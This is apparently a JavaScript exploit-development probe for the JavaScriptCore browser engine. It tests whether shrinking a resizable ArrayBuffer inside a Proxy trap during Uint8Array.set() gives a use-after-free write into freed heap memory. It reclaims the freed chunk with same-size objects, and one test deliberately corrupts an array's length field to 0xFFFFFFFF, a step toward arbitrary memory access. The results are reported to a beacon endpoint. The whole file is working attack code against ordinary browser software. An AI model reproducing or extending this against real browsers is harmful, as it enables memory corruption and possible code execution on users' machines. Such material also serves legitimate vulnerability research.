/* p76-reclaim — Decisive W2 write-path test: freed-chunk RECLAIM inside the trap.
 *
 * Why p75's approach can't answer the question:
 *   V74X X1/X6/X7 prove W2 bytes never appear in the LIVE store (grow-back,
 *   clone, fixed views — all clean). X6's "matched=32" rows were false
 *   positives: those offsets all had marker (off & 0xFF) === 0x00, i.e. the
 *   marker equaled the zero-fill.
 *
 * Two models remain:
 *   MODEL A: set() re-checks the current length per element and silently
 *            SKIPS writes past it.  => W2 is not a write primitive.
 *   MODEL B: resize() REALLOCATES the store (alloc new, copy, free old) and
 *            set() writes through the STALE vector into the FREED chunk.
 *            => W2 is a bmalloc use-after-free WRITE. Invisible in V74X
 *            because nobody re-occupied the freed chunk before the checks.
 *            (X1's zeros on grow-back are then explained by the grow
 *            allocating a fresh zero-filled store — JSC zero-fills
 *            ArrayBuffer stores at allocation.)
 *
 * The discriminator: inside the Proxy trap (after resize, before set() keeps
 * writing), allocate same-size-class objects to RE-CLAIM the freed chunk.
 * If MODEL B, our bytes land inside the reclaim objects and become visible.
 *
 * Size classes (bmalloc small lines):
 *   ArrayBuffer(512) store            -> 512
 *   new Array(63) butterfly (8+63*8)  -> 512   (header at +0: publicLength
 *                                               u32 @0, vectorLength u32 @4)
 *
 *   R0: baseline W2, no reclaim (expect clean, reproduces X1)
 *   R1: reclaim with ArrayBuffer(512) — A-Z pattern inside reclaim = MODEL B
 *   R3: pure realloc probe: shrink WITHOUT set, reclaim, look for 0xAA fill
 *       (informative only if JSC does NOT zero-fill ArrayBuffer allocs)
 *   R2: reclaim with Array(63) butterflies, write 0xFF x 256 @0 =>
 *       publicLength=vectorLength=0xFFFFFFFF => JSArray length corruption.
 *       RISKIEST (heap corruption) — runs LAST, beacons immediately.
 *
 * Beacon prefix: V76R-
 */
(function(){
"use strict";
var RUN_ID = "v76r" + Math.random().toString(36).slice(2,12);
var PREFIX = "V76R-";

function B(tag, body) {
  try {
    var d = typeof body === "object" ? JSON.stringify(body) : String(body);
    fetch("/beacon/" + PREFIX + tag, {
      method: "POST", body: JSON.stringify({r: RUN_ID, b: d.slice(0,900)}),
      headers: {"Content-Type":"application/json"}
    }).catch(function(){});
  } catch(e){}
}

try {
  var ac = new (window.AudioContext || window.webkitAudioContext)();
  var osc = ac.createOscillator();
  var gain = ac.createGain();
  osc.connect(gain); gain.connect(ac.destination);
  osc.frequency.value = 880; gain.gain.value = 0.3;
  osc.start(); osc.stop(ac.currentTime + 0.15);
} catch(e){}

B("L", "press76-reclaim: does W2 write into the freed chunk?");

/* ====== R0: baseline W2, no reclaim ====== */
function test_R0() {
  var r = {};
  try {
    var rab = new ArrayBuffer(512, { maxByteLength: 512 });
    var u8 = new Uint8Array(rab);
    for (var i = 0; i < 512; i++) u8[i] = 0xEE;

    var src = new Uint8Array(256);
    for (var j = 0; j < 256; j++) src[j] = 0x41 + (j % 26);

    var triggered = false;
    var proxy = new Proxy(src, {
      get: function(t, p) {
        if (p === '0' && !triggered) { triggered = true; rab.resize(32); }
        return t[p];
      }
    });
    try { u8.set(proxy, 0); r.setOK = true; } catch(e) { r.setErr = String(e).slice(0,60); }

    r.dstLen = rab.byteLength;
    rab.resize(512);
    var w = new Uint8Array(rab);
    var match = 0, ee = 0;
    for (var m = 0; m < 512; m++) {
      if (w[m] === 0x41 + (m % 26)) match++;
      if (w[m] === 0xEE) ee++;
    }
    r.patternMatch = match;   // expect 0
    r.survivedEE = ee;        // expect 32 under MODEL B (grow copies [0,32))
  } catch(e) { r.err = String(e).slice(0,80); }
  B("R0-BASELINE", r);
}

/* ====== R1: reclaim freed chunk with ArrayBuffer(512) inside the trap ====== */
function test_R1() {
  var r = {};
  try {
    var rab = new ArrayBuffer(512, { maxByteLength: 512 });
    var u8 = new Uint8Array(rab);
    for (var i = 0; i < 512; i++) u8[i] = 0xEE;

    var src = new Uint8Array(256);
    for (var j = 0; j < 256; j++) src[j] = 0x41 + (j % 26);

    var reclaims = [];
    var triggered = false;
    var proxy = new Proxy(src, {
      get: function(t, p) {
        if (p === '0' && !triggered) {
          triggered = true;
          rab.resize(32);                // frees the 512B store (MODEL B)
          for (var k = 0; k < 48; k++)   // grab the freed chunk ASAP
            reclaims.push(new ArrayBuffer(512));
        }
        return t[p];
      }
    });
    try { u8.set(proxy, 0); r.setOK = true; } catch(e) { r.setErr = String(e).slice(0,60); }

    var hits = [];
    for (var m = 0; m < reclaims.length; m++) {
      var v = new Uint8Array(reclaims[m]);
      var match = 0;
      for (var n = 0; n < 256; n++) if (v[n] === 0x41 + (n % 26)) match++;
      if (match >= 250) hits.push(m + ":" + match);
    }
    r.reclaims = reclaims.length;
    r.hits = hits.slice(0, 6).join("|");
    r.WRITE_INTO_FREED = hits.length > 0;

    rab.resize(512);
    var w = new Uint8Array(rab);
    var match2 = 0;
    for (var q = 0; q < 512; q++) if (w[q] === 0x41 + (q % 26)) match2++;
    r.livePattern = match2;             // expect 0
  } catch(e) { r.err = String(e).slice(0,80); }
  B("R1-AB-RECLAIM", r);
}

/* ====== R3: pure realloc discriminator — shrink, reclaim, look for 0xAA ====== */
function test_R3() {
  var r = {};
  try {
    var rab = new ArrayBuffer(512, { maxByteLength: 512 });
    var u8 = new Uint8Array(rab);
    for (var i = 0; i < 512; i++) u8[i] = 0xAA;
    rab.resize(32);

    var reclaims = [];
    for (var k = 0; k < 48; k++) reclaims.push(new ArrayBuffer(512));

    var hits = [];
    for (var m = 0; m < reclaims.length; m++) {
      var v = new Uint8Array(reclaims[m]);
      var aa = 0;
      for (var n = 0; n < 512; n++) if (v[n] === 0xAA) aa++;
      if (aa >= 480) hits.push(m + ":" + aa);
    }
    r.hits = hits.slice(0, 6).join("|");
    r.REALLOC_CONFIRMED = hits.length > 0;
    // NOTE: false even under MODEL B if ArrayBuffer alloc zero-fills.
    // R1 is the authoritative write-path test.
  } catch(e) { r.err = String(e).slice(0,80); }
  B("R3-REALLOC-PROBE", r);
}

/* ====== R2: reclaim with JSArray butterfly -> length corruption ====== */
function test_R2() {
  var r = {};
  try {
    var rab = new ArrayBuffer(512, { maxByteLength: 512 });
    var u8 = new Uint8Array(rab);
    for (var i = 0; i < 512; i++) u8[i] = 0x11;

    var src = new Uint8Array(256);
    for (var j = 0; j < 256; j++) src[j] = 0xFF;

    var holes = [];
    var triggered = false;
    var proxy = new Proxy(src, {
      get: function(t, p) {
        if (p === '0' && !triggered) {
          triggered = true;
          rab.resize(32);
          for (var k = 0; k < 48; k++) {
            var a = new Array(63);
            for (var d = 0; d < 63; d++) a[d] = 0x1234;
            holes.push(a);
          }
        }
        return t[p];
      }
    });
    try { u8.set(proxy, 0); r.setOK = true; } catch(e) { r.setErr = String(e).slice(0,60); }

    var corr = [];
    for (var m = 0; m < holes.length; m++) {
      try {
        var L = holes[m].length;
        if (L === 4294967295) corr.push(m);
      } catch(e) { corr.push(-1); }
    }
    r.corruptedIdx = corr.slice(0, 8).join(",");
    r.LENGTH_CORRUPT = corr.length > 0;

    if (corr.length > 0 && corr[0] >= 0) {
      var a = holes[corr[0]];
      var demo = [];
      for (var q = 0; q < 3; q++) demo.push(a[q]);          // data region (0xFF doubles)
      try { demo.push(a[64]); } catch(e) { demo.push("EXC64"); }
      try { demo.push(a[100]); } catch(e) { demo.push("EXC100"); }
      r.demo = demo.slice(0, 8).join(",");
    }
  } catch(e) { r.err = String(e).slice(0,80); }
  B("R2-BFLY-LENCORR", r);
}

/* ====== Run: R2 last (crash risk) ====== */
try {
  test_R0();
  setTimeout(test_R1, 350);
  setTimeout(test_R3, 900);
  setTimeout(test_R2, 1600);
} catch(e) { B("FATAL", String(e).slice(0,200)); }

var hbI = setInterval(function(){ B("HB","hb"); }, 2000);
setTimeout(function(){ clearInterval(hbI); B("Z2","probe76-done"); }, 7000);
})();
